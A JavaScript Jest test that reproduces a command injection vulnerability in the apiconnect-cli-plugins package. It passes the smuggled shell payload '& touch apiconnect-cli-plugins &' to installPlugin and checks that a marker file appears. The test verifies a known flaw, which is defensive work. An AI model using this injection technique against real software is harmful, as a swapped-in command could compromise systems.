//https://snyk.io/vuln/SNYK-JS-APICONNECTCLIPLUGINS-564427
test("Command Injection in apiconnect-cli-plugins", () => {
  expect.assertions(2);
  const root = require("apiconnect-cli-plugins");
  const fs = require("fs");
  const path = "./apiconnect-cli-plugins";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      // console.log('File removed:', path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let payload = "& touch apiconnect-cli-plugins &";
  return root.pluginLoader.installPlugin(payload, "").catch(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
